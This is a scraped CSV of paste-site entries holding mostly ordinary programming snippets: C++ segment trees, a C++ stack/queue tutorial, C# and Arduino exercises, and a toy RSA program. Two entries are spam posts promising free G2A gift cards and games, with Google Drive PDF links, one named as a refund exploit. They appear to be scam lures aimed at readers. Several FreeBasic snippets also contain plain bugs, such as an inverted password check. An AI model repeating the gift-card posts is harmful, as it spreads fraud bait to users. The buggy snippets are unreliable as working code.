id,title,username,language,date,content
EqVXj0kU,Untitled,Josif_tepe,C++,Thursday 9th of May 2024 01:03:28 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int maxn = 1e6 + 10;
const int INF = 2e9;
int closing_bracket[maxn];

vector<int> segment_tree[3 * maxn];
vector<int> merge_two_nodes(vector<int> & a, vector<int> & b) {
    int i = 0, j = 0;
    vector<int> c;
    while(i < (int) a.size() and j < (int) b.size()) {
        if(a[i] <= b[j]) {
            c.push_back(a[i]);
            i++;
        }
        else {
            c.push_back(b[j]);
            j++;
        }
    }
    while(i < (int) a.size()) {
        c.push_back(a[i]);
        i++;
    }
    while(j < (int) b.size()) {
        c.push_back(b[j]);
        j++;
    }
    return c;
}
void build_tree(int L, int R, int node) {
    if(L == R) {
        segment_tree[node].push_back(closing_bracket[L]);
    }
    else {
        int middle = (L + R) / 2;
        build_tree(L, middle, 2 * node);
        build_tree(middle + 1, R, 2 * node + 1);
        segment_tree[node] = merge_two_nodes(segment_tree[2 * node], segment_tree[2 * node + 1]);
    }
}
// L R i L R j L R 
int query(int L, int R, int node, int i, int j) {
    if(R < i or j < L) {
        return 0;
    }
    if(i <= L and R <= j) {
        return (int) (lower_bound(segment_tree[node].begin(), segment_tree[node].end(), j + 1) - segment_tree[node].begin());
    }
    int middle = (L + R) / 2;
    return query(L, middle, 2 * node, i, j) + query(middle + 1, R, 2 * node + 1, i, j);
}
int main() {
    ios_base::sync_with_stdio(false);
    string s;
    cin >> s;

    stack<int> st;
    for(int i = 0; i < (int) s.size(); i++) {
        closing_bracket[i] = INF;
    }
    for(int i = 0; i < (int) s.size(); i++) {
        if(s[i] == '(') {
            st.push(i);
        }
        else {
            if(!st.empty()) {
                closing_bracket[st.top()] = i;
                st.pop();
            }
        }
    }
    int n = (int) s.size();
    build_tree(0, n - 1, 1);

    int q;
    cin >> q;
    for(int i = 0; i < q; i++) {
        int a, b;
        cin >> a >> b;

        a--; b--;

        cout << query(0, n - 1, 1, a, b) * 2 << ""\n"";
    }
    
    
    return 0;
}
"
6d1LDdsn,Untitled,Rodunskiy,C#,Thursday 9th of May 2024 12:52:46 PM CDT,"using System;

namespace CSLight
{
    public class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();

            int number = 1;
            int startNumber = 2;
            int power = 0;
            int maxNumberRandom = 100;
            int numberRandom = random.Next(maxNumberRandom);

            while (number < numberRandom) 
            {
                power++;
                number *= startNumber;
            }

            Console.WriteLine($""Сгенерированное число: {numberRandom}\n"" +
                $""Минимальная степень двойки, превосходящая рандомное число: {power}\n"" +
                $""Число в степени:{number}"");
        }
    }
}

"
9XA72ZR9,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Thursday 9th of May 2024 12:50:59 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
09 May 2024"
ymh51uwj,LCD Text rev_01,pleasedontcode,Arduino,Thursday 9th of May 2024 12:44:44 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: LCD Text
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-09 17:44:05

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* This code will breathalyzer with a library liquid */
	/* cristal_I2c with  address 0x27 and measurements of */
	/* 12x2 ; and make calculate the level of alcohol in */
	/* grams; with connections from MQ3 to Arduino= VCC */
	/* to 5V, 6ND to 6ND, A6 to A0; Arduino to LCD =6ND t */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>	//https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t display_LCD1602I2C_I2C_PIN_SDA_A4		= A4;
const uint8_t display_LCD1602I2C_I2C_PIN_SCL_A5		= A5;
const uint8_t display_LCD1602I2C_I2C_SLAVE_ADDRESS		= 0x27;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(0x27, 12, 2);  // set the LCD address to 0x27 for a 12 chars and 2 line display

void setup(void)
{
	// put your setup code here, to run once:
	lcd.init();                      // initialize the lcd 
	lcd.backlight();
	lcd.setCursor(3, 0);
	lcd.print(""Hello, world!"");
	lcd.setCursor(2, 1);
	lcd.print(""Ywrobot Arduino!"");
	lcd.setCursor(0, 2);
	lcd.print(""Arduino LCM IIC 2004"");
	lcd.setCursor(2, 3);
	lcd.print(""Power By Ec-yuan!"");
}

void loop(void)
{
	// put your main code here, to run repeatedly:
}
"
kdbj8mGW,Untitled,Josif_tepe,C++,Thursday 9th of May 2024 12:21:18 PM CDT,"#include <bits/stdc++.h>
using namespace std;
const int maxn = 2e5 + 10;
int next_idx[maxn];

vector<int> segment_tree[3 * maxn];
vector<int> merge_two_nodes(vector<int> & a, vector<int> & b) {
    int i = 0, j = 0;
    vector<int> c;
    while(i < (int) a.size() and j < (int) b.size()) {
        if(a[i] <= b[j]) {
            c.push_back(a[i]);
            i++;
        }
        else {
            c.push_back(b[j]);
            j++;
        }
    }
    while(i < (int) a.size()) {
        c.push_back(a[i]);
        i++;
    }
    while(j < (int) b.size()) {
        c.push_back(b[j]);
        j++;
    }
    return c;
}
void build_tree(int L, int R, int node) {
    if(L == R) {
        segment_tree[node].push_back(next_idx[L]);
    }
    else {
        int middle = (L + R) / 2;
        build_tree(L, middle, 2 * node);
        build_tree(middle + 1, R, 2 * node + 1);
        segment_tree[node] = merge_two_nodes(segment_tree[2 * node], segment_tree[2 * node + 1]);
    }
}
// L R i L R j L R 
int query(int L, int R, int node, int i, int j) {
    if(R < i or j < L) {
        return 0;
    }
    if(i <= L and R <= j) {
        return (int) segment_tree[node].size() - (lower_bound(segment_tree[node].begin(), segment_tree[node].end(), j + 1) - segment_tree[node].begin());
    }
    int middle = (L + R) / 2;
    return query(L, middle, 2 * node, i, j) + query(middle + 1, R, 2 * node + 1, i, j);
}
int main() {
    ios_base::sync_with_stdio(false);
    int n, q;
    cin >> n >> q;
    for(int i = 0; i < n; i++) {
        next_idx[i] = n;
    }
    vector<pair<int, int>> v(n);
    for(int i = 0; i < n; i++) {
        cin >> v[i].first;
        v[i].second = i;
    }
    sort(v.begin(), v.end());

    for(int i = 0; i < n - 1; i++) {
        if(v[i].first == v[i + 1].first) {
            next_idx[v[i].second] = v[i + 1].second;
        }
    }
    build_tree(0, n - 1, 1);
    
    
    for(int i = 0; i < q; i++) {
        int a, b;
        cin >> a >> b;
        a--; b--;

        cout << query(0, n - 1, 1, a, b) << endl;
    }

    
    return 0;
}
"
ipNrfPdX,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 9th of May 2024 12:13:11 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_220275.pdf

Working as of:
09 May 2024"
fHLsYRXV,Untitled,Mysoft,FreeBasic,Thursday 9th of May 2024 11:56:41 AM CDT,"sub CountDown( as long iCount )
  for N as long = iCount to 0 step-1
    sleep 1000,1
  next N
end sub

sub PrintSquare( iWid as long , iHei as long , cChar as ubyte )
  for iH as long = 0 to iHei-1
    for iW as long = 0 to iWid-1
      print chr(cChar);
    next iH
  next iW
end sub
  
sub CheckPassword( sPass as string )
  if sPass<>""password""
    print ""Yay, proceed!""
  else
    print ""Bad password!""
  end if
end sub

function IsEven( iNum as long ) as boolean
  if (iNum and 1) >< 0 then return false
  return true
end function

function Uppercase( iChar as long ) as long
  return iif( iChar>=asc(""a"") andalso iChar <= asc(""b"") , (iChar+32) , (iChar)
end function"
2bfy45uN,RSA encryption code,PadmaJS,Erlang,Thursday 9th of May 2024 11:14:34 AM CDT,"import java.util.*;

public class RSAEncryption {
  RSAEncryption() {
    Scanner sc = new Scanner(System.in);
    System.out.print(""Enter a prime number for p: "");
    int p = sc.nextInt();
    System.out.print(""Enter a prime number for q: "");
    int q = sc.nextInt();
    int n = p * q;
    int phi = (p - 1) * (q - 1);
    int d, e;
    do {
      System.out.print(""Enter value of public key e: "");
      e = sc.nextInt();
    } while (RSAEncryption.getGCD(e, phi) != 1);

    for (d = 1; d < phi; d++) {
      if ((e * d) % phi == 1) {
        break;
      }
    }

    System.out.print(""Enter message: "");
    int message = sc.nextInt();

    int encrypted = RSAEncryption.modPow(e, n, message);
    System.out.println(""Encrypted message:"" + encrypted);

    int decrypted = RSAEncryption.modPow(d, n, encrypted);
    System.out.println(""Decrypted message: "" + decrypted);
  }

  static int getGCD(int a, int b) {
    while (b != 0) {
      int temp = b;
      b = a % b;
      a = temp;
    }
    return a;
  }

  static int modPow(int exp, int mod, int base) {
    int result = 1;
    base = base % mod;
    for (int i = 0; i < exp; i++) {
      result = (result * base) % mod;
    }
    return result;
  }

  public static void main(String[] args) {
    new RSAEncryption();
  }
}"
yK7uqcSQ,Untitled,Mysoft,FreeBasic,Thursday 9th of May 2024 11:02:55 AM CDT,"Function CheckLimit( Number as long , Maximum , Minimum as long  ) as boolean
  if Number >= Minimum andalso Number <= Minimum then return true
  return false
end function"
fcY1RLBE,stack queue deque,LEGEND2004,C++,Thursday 9th of May 2024 10:42:25 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long

signed main()
{
    ios_base::sync_with_stdio(0);
    cin.tie(0);

    /*
    stack<int> s;
    s.push(x); // x elave eleyir
    s.top(); // en son (ustdeki) element
    s.pop(); // en son (ustdeki) elementi sil
    s.size(); // olcusu
    s.empty(); // bosdurmu?
    */
    /*
    stack<int> s;
    s.push(5);
    s.push(7);
    s.push(2); // 5 7 2

    cout << s.size() << '\n';

    cout << s.top() << '\n'; // 2
    s.pop();
    cout << s.top() << '\n'; // 7
    s.pop();
    cout << s.top() << '\n'; // 5
    s.pop();
    cout << (s.size() == 0) << '\n';

    while(!s.empty()){
        cout << s.top() << '\n';
        s.pop();
    }

*/
    /*
    queue<int> q;
    q.push(x); // x elave eleyir
    q.front(); // en ilk (soldaki) element
    q.pop(); // en ilk (soldaki) element sil
    q.size(); // olcusu
    q.empty(); // bosdurmu?
    */
    /*
    queue<int> q;
    q.push(5);
    q.push(7);
    q.push(2); // 7 2

    cout << q.size() << '\n'; // 3
    cout << q.front() << '\n'; // 5
    q.pop();
    cout << q.front() << '\n'; // 7
    q.pop();
    cout << q.front() << '\n'; // 2


    while(!q.empty()){
        cout << q.front() << '\n';
        q.pop();
    }
    */
    /*
    deque<int> q;
    q.size(); // olcusu
    q.empty(); // bosdurmu?
    //front ...   back
    q.front(); // soldaki element
    q.push_front(x); // x sola elave
    q.pop_front(); // soldakini sil

    q.back(); // sagdaki element
    q.push_back(x); // x saga elave
    q.pop_back(); // en sagdaki sil
    */
    // big o notation
    // O(1)
    // + - * /
    /*
    // O(n)
    for(int i = 1; i <= 2 * n; i++){
        // O(1)
    }

    // O(n * n)
    for(int i = 1; i <= n; i++){
        for(int j = 1; j <= n; j++){

        }
    }
    */

    // 2 * n * n + 5 * n --> O(n * n)
    // 1 sec ~ 10^8 operations

    /*
    deque<int> q;
    q.push_front(5);
    q.push_back(7);
    q.push_front(2);
    q.push_back(9);
    q.push_front(1);
    // front .. ..  back
    // 1 2 5 7 9

    for(int i = 0; i < q.size(); i++){
        cout << q[i] << "" "";
    }
    cout << '\n';

    for(int i : q)
        cout << i << "" "";
    cout << '\n';

    cout << q.front() << '\n'; // 1
    q.pop_back();
    cout << q.front() << '\n'; // 1
    cout << q.back() << '\n'; // 7
    q.pop_back();
    cout << q.back() << '\n'; // 5
    q.pop_front();
    cout << q.front() << '\n'; // 2
    cout << q.size() << '\n'; // 2
*/
}
"
